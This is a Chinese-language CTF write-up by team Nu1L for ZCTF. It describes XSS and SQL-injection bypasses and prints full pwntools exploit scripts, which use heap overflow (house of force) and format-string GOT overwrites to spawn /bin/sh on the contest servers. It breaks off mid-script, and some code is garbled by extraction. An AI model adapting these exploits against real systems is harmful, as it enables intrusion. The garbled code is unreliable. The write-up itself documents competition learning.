ZCTF writeup
Nu1L
Misc:
Russian zips
我的世界的东西。。。
Zctf{4t1Ve_!}
Sign in
公众号回复 flag
misc400
stegsolve 看图片发现这个
文件末尾有一串 base64，解密得到一个损坏的压缩包 修复后解压。发现很多 txt，有一个
start，打开是乱码，但是看内容前几个字符，发现是 bz2 的文件头，把后缀改成 bz2 就可
以解压了，发现还有一个 txt 指向下一个 txt，于是，把所有的 txt 改成 bz2，在 windows
下批量解压，然后在 linux 下 cat 所有文件，直接得到了密码，然后解压 flag.rar 得到密
码
Web:
Web100
.index.php.swp
然后 substr 后的数值是 0e 开头，典型的弱类型比较，写个脚本就 ok：
Web100-find my eyes
有一个联系管理的地方，在textarea的地方可以xss，过滤了很多，根据csp看到只能利用script
实现绕过，想到以前看到过pkav的一个payload，拿过来改改，过滤了#用@替代，过滤了冒
号，所以最终payload是
Name=albertchang&Email=PI:EMAIL&Team=aaaaaaaaasdsadsads&textarea=
Web200apk
抓包。在 burp 发包，发现当输入为 1’ OR 1=1#时返回 admin，猜测为注入
于是把加密算法分出来，经过测试，发现过滤很严，最后用 desc 成功盲注，密码为：
CleverBoy123。
然后进入第二层 mail.php，猜测是 PHPMailer 的洞，一发 exp 打过去拿到 flag:
RE
easy reverse
一个 dll，调用 get_string 进入程序流程，将输入加密后与程序中保存的结果对比。由于加
密是两个字符一个单位，爆破可以非常容易的得到对应关系，然后解密即可。
dll 调用可以使用 python 的 ctypes 库完成，之后 ida attach 找到对应 dll 调试即可。
算结果用的脚本
remap = {0L: 27499, 1L: 19098, 3L: 2467, 4L: 18454, 6L: 10763, 7L: 171
63, 10L: 2771, 11L: 12963, 12L: 23111}#太多不写了。。
b = [0xbf,0xf1,0x6a,0x2c,0x10,0xb,0x16,0x59,0xba,0x3a,0x8c,0x49,0x5,0x1b,
0x4,0xe2,0x85,0xd5,0xc2,0xfc,0xd7,0x9b,0xe9,0x42]
output= ""
for i in range(0,len(b),2):
out = remap[(b[i]>8)
print output
QExtend
程序有两次校验，第一层为汉诺塔，要把一个形如
aa
cc
dd bb ee
的汉诺塔的圆盘全部移动到中间一个柱子上，且总步数不能超过 26。
这步直接暴力搜索即可获取所有路线，大概有十几条。
第二层为判断输入去除 ZCTF{}后进行 md5 得到的结果是否与程序中保存的一致。
第一步限定条件过于简单，导致有大量输入可以通过校验，全部算一遍 md5 不现实暂时卡
住。
第二天提示最优解，于是找出最短的执行序列
steps = [['!', '1', 'A', 'Q', 'a', 'q'], ['&', '6', 'F', 'V', 'f', 'v'], ['$', '4', 'D', 'T', 'd', 't'], ['#',
'3', 'C', 'S', 'c', 's'], ['&', '6', 'F', 'V', 'f', 'v'], ['%', '5', 'E', 'U', 'e', 'u'], ['"', '2', 'B', 'R', 'b',
'r'], ['!', '1', 'A', 'Q', 'a', 'q'], ['%', '5', 'E', 'U', 'e', 'u'], ['"', '2', 'B', 'R', 'b', 'r'], ['#', '3',
'C', 'S', 'c', 's'], ['$', '4', 'D', 'T', 'd', 't'], ['"', '2', 'B', 'R', 'b', 'r'], ['!', '1', 'A', 'Q', 'a', 'q'],
['%', '5', 'E', 'U', 'e', 'u'], ['&', '6', 'F', 'V', 'f', 'v'], ['#', '3', 'C', 'S', 'c', 's'], ['%', '5', 'E',
'U', 'e', 'u'], ['"', '2', 'B', 'R', 'b', 'r'], ['!', '1', 'A', 'Q', 'a', 'q'], ['%', '5', 'E', 'U', 'e', 'u']]
steps[i]即代表第 i 位可能的字符。
之后使用 hashcat 爆破 md5。hashcat 默认只支持 4 个自定义字符集，而由于汉诺塔有 6
种移动方式需要6种字符集，于是修改 hashcat 的代码在mpsp.c中将系统预留的 l 和 u 字
符集改为第 5 种和第 6 种移动方式。
之后使用修改后的 hashcat 爆破：
hashcat -m 0 -a 3 --custom-charset1 '!1AQaq' --custom-charset2 '"2BRbr'
--custom-charset3 '#3CScs' --custom-charset4 '$4DTdt' ../target.hash
'?1?u?4?3?u?l?2?1?l?2?3?4?2?1?l?u?3?l?2?1?l'
得到 flag A&$#&5rA5r#$rA5&#5rA5
PWN
Dragon
由于 add 时的 name 经过 strdup，在 edit 时会导致 heap overflow，可以溢出到 top_chunk 上
的 size，另外在 list 时可以 leak heap 的地址，这样就可以进行 house of force 实现任意地址
写，我这里改写了 note array 的值，最后修改 got 表 getshell
from pwn import *
DEBUG = 1
ATTACH = 0
LOCAL = 0
if DEBUG:
context.log_level = 'debug'
if LOCAL:
io = process('./dragon')
if ATTACH:
gdb.attach(io)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
io = remote('58.213.63.30', 11501)
libc = ELF('./libc-2.19.so')
def add_note(name_size, name, content):
io.recvuntil('>> ')
io.sendline('1')
io.recvuntil('please input note name size: ')
io.sendline(str(name_size))
io.recvuntil('please input note name: ')
io.send(name)
io.recvuntil('please input note content: ')
io.send(content)
def edit_note(index, content):
io.recvuntil('>> ')
io.sendline('2')
io.recvuntil('input note id: ')
io.sendline(str(index))
io.recvuntil('please input new note content: ')
io.send(content)
def delete_note(index):
io.recvuntil('>> ')
io.sendline('3')
io.recvuntil('input note id: ')
io.sendline(str(index))
def list_note(index):
io.recvuntil('>> ')
io.sendline('4')
io.recvuntil('input note id: ')
io.sendline(str(index))
elf = ELF('./dragon')
#raw_input('go?')
add_note(32, 'bird1\n', 'a\n')
add_note(32, 'bird2\n', 'b\n')
payload1 = p64(elf.got['puts']) * 4
add_note(32, payload1, 'c\n')
add_note(32, 'bird3\n', 'd\n')
edit_note(0, 'A' * 32)
list_note(0)
io.recvuntil('A' * 32)
content = io.recvuntil('\n')
heap_addr = u64(content[:-1].ljust(8, '\x00'))
log.info('heap_addr:%#x' % heap_addr)
heap_addr2 = heap_addr + (0x1ebc110 - 0x1ebc0a0)
log.info('heap_addr2:%#x' % heap_addr2)
delete_note(2)
edit_note(3, 'A' * 24 + p64(0xffffffffffffffff))
# house of force
fake_size = 0x6020E0 - 16 * 3 - (heap_addr + 0x14d91c0 - 0x14d90a0)
io.recvuntil('>> ')
io.sendline('1')
io.recvuntil('please input note name size: ')
io.sendline(str(fake_size))
io.recvuntil('please input note name: ')
io.recvuntil('please input note content: ')
io.send('A' * 32)
payload2 = p64(heap_addr2) * 4
edit_note(4, payload2)
list_note(0)
io.recvuntil('name: ')
content = io.recvn(6).ljust(8, '\x00')
puts_addr = u64(content)
system_addr = libc.symbols['system'] - libc.symbols['puts'] + puts_addr
log.info('puts_addr:%#x' % puts_addr)
log.info('system_addr:%#x' % system_addr)
edit_note(0, '/bin/sh\x00' + p64(system_addr) + '\n')
io.interactive()
Login (Pwn 200)
栈溢出但是有 canary，不过可以通过覆盖栈上的格式化字符串造成 fsb
脚本：
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
import os, sys
# switches
DEBUG = 0
LOCAL = 0
VERBOSE = 1
os.environ['LD_PRELOAD'] = './libc-2.19.so'
# modify this
if LOCAL:
io = process('./login')
else:
io = remote('58.213.63.30',4002)
if VERBOSE: context(log_level='debug')
# define symbols and offsets here
# simplified r/s function
def ru(delim):
return io.recvuntil(delim)
def rn(count):
return io.recvn(count)
def ra(count):
# recv all
buf = ''
while count:
tmp = io.recvn(count)
buf += tmp
count -= len(tmp)
return buf
def sl(data):
return io.sendline(data)
def sn(data):
return io.send(data)
def info(string):
return log.info(string)
def dehex(s):
return s.replace(' ','').decode('hex')
def limu8(x):
return c_uint8(x).value
def limu16(x):
return c_uint16(x).value
def limu32(x):
return c_uint32(x).value
# define interactive functions here
def reg(username, password):
ru('username:')
sl(username)
ru('password:')
sl(password)
return
# define exploit function here
def pwn():
if DEBUG: gdb.attach(io)
stack_chk_fail_got = 0x0804A014
puts_got = 0x0804A01C
main = 0x0804878C
addrs = p32(stack_chk_fail_got) + p32(stack_chk_fail_got+1) +
p32(stack_chk_fail_got+2) + p32(stack_chk_fail_got+3)
pad =
'AAAAAAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJ
AAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9'
prefix = addrs + pad[16:]
uname = prefix
fmtstr = '~~~'
fmtstart = 3
for i in xrange(4):
fmtstr += '%' + '%03d'%(ord(p32(main)[i]) - fmtstart + 256) + 'c%' + str(10+i)
+ '$hhn'
fmtstart = ord(p32(main)[i])
uname += fmtstr
uname = uname.ljust(0x100)
reg(uname, '1')
uname = p32(0x0804A00C) + pad[4:]
fmtstr = '!!!%10$s!!!'
uname += fmtstr
reg(uname, '1')
ru('!!!!!!')
read_addr = u32(rn(4))
info("read_addr = " + hex(read_addr))
#read_offset = 0x000daf60
read_offset = 0xd9880
#system_offset = 0x00040310
system_offset = 0x3fe70
libc = read_addr - read_offset
system = libc + system_offset
for i in xrange(4):
uname = 70*'A'
reg(uname, '1')
#environ_offset = 0x1ACE00
environ_offset = 0x1A8E00
environ_addr = libc + environ_offset
addrs = p32(environ_addr+1) + p32(environ_addr+2) + p32(environ_addr+3)
uname = addrs + pad[12:]
fmtstr = '~~~'
fmtstart = 3
env = '\xa4\x04\x08'
for i in xrange(3):
fmtstr += '%' + '%03d'%(ord(env[i]) - fmtstart + 256) + 'c%' + str(10+i) + '$hhn'
fmtstart = ord(env[i])
uname += fmtstr
uname = uname.ljust(0x100)
reg(uname, '1')
for i in xrange(4):
uname = 70*'A'
reg(uname, '1')
addrs = '/bin/sh;' + p32(puts_got) + p32(puts_got+1) + p32(puts_got+2) +
p32(puts_got+3)
uname = addrs + pad[24:]
fmtstart = 3
fmtstr = '~~~'
for i in xrange(4):
fmtstr += '%' + '%03d'%(ord(p32(system)[i]) - fmtstart + 256) + 'c%' + str(12+i)
+ '$hhn'
fmtstart = ord(p32(system)[i])
uname += fmtstr
uname = uname.ljust(0x100)
reg(uname, '1')
sl('/bin/sh;')
sl('/bin/sh;')
io.interactive()
return
if __name__ == '__main__':
pwn()
Class (Pwn 300)
初始化的 malloc 之前有整数溢出转化为堆溢出，然后修改堆上申请的 jmp_buf
脚本：
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
import os, sys
# switches
DEBUG = 0
LOCAL = 0
VERBOSE = 1
# modify this
if LOCAL:
io = process('./class')
else:
io = remote('58.213.63.30', 4001)
if VERBOSE: context(log_level='debug')
# define symbols and offsets here
# simplified r/s function
def ru(delim):
return io.recvuntil(delim)
def rn(count):
return io.recvn(count)
def ra(count):
# recv all
buf = ''
while count:
tmp = io.recvn(count)
buf += tmp
count -= len(tmp)
return buf
def sl(data):
return io.sendline(data)
def sn(data):
return io.send(data)
def info(string):
return log.info(string)
def dehex(s):
return s.replace(' ','').decode('hex')
def limu8(x):
return c_uint8(x).value
def limu16(x):
return c_uint16(x).value
def limu32(x):
return c_uint32(x).value
# define interactive functions here
iOverflow = 92233720368547759
def init(count):
ru('student:')
sl(str(count))
return
def menu():
return ru('>>')
def add(name, age, addr, intro):
menu()
sl('1')
ru('name:')
sl(name)
ru('age:')
sl(str(age))
ru('addr:')
sl(addr)
ru('introduce:')
sl(intro)
return
def edit(index, name, age, addr, intro):
menu()